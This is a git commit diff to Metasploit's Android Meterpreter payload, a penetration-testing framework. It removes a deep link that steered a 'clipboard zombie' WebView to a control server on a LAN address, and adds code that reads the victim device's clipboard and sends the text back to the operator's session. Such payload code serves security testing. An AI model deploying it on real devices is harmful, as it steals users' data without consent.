e4b5acc56c01265095421f4960403a520e38b427
Manwel Bugeja <manwelbugeja@Manwels-MBP-2.lan>
2023-02-28 11:59:46 +0100

    removed clipboard zombie

--- java/androidpayload/library/src/com/metasploit/meterpreter/android/clipboard_get_data.java
+++ java/androidpayload/library/src/com/metasploit/meterpreter/android/clipboard_get_data.java
@@ -1,3 +1,4 @@
+
 package com.metasploit.meterpreter.android;
 
 import com.metasploit.meterpreter.AndroidMeterpreter;
@@ -7,41 +8,23 @@ import com.metasploit.meterpreter.TLVPacket;
 import com.metasploit.meterpreter.TLVType;
 import com.metasploit.meterpreter.command.Command;
 
-import android.app.PendingIntent;
-import android.content.BroadcastReceiver;
-import android.content.Intent;
-import android.content.IntentFilter;
-import android.app.Activity;
-import android.content.Context;
-import android.net.Uri;
-import android.content.ActivityNotFoundException;
-import android.content.ComponentName;
-import android.content.pm.PackageManager;
-import android.content.pm.ResolveInfo;
-
 public class clipboard_get_data implements Command {
 
     @Override
     public int execute(Meterpreter meterpreter, TLVPacket request, final TLVPacket response) throws Exception {
         AndroidMeterpreter androidMeterpreter = (AndroidMeterpreter)meterpreter;
-        final Context context = androidMeterpreter.getContext();
-
-       /* Android Q poses limitations on starting activities
-        *
-        * https://developer.android.com/guide/components/activities/background-starts
-        */
-
-        // Starts intent with deeplink to navigate SMSZombie's WebView to control website
-        try {
-            Intent intent = new Intent("android.intent.action.VIEW",
-                        Uri.parse("walkingdead://clipboardzombie/?url=http://192.168.1.134:1313"));
-            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-            context.startActivity(intent);
-            return ERROR_SUCCESS;
-        } catch (ActivityNotFoundException e) {
+        ClipManager clipManager = androidMeterpreter.getClipManager();
+        if (clipManager == null) {
             return ERROR_FAILURE;
         }
 
+        String text = clipManager.getText();
+        if (text != null) {
+            TLVPacket pckt = new TLVPacket();
+            pckt.add(TLVType.TLV_TYPE_EXT_CLIPBOARD_TYPE_TEXT_CONTENT, text);
+            response.addOverflow(TLVType.TLV_TYPE_EXT_CLIPBOARD_TYPE_TEXT, pckt);
+        }
+        return ERROR_SUCCESS;
 
     }
 }
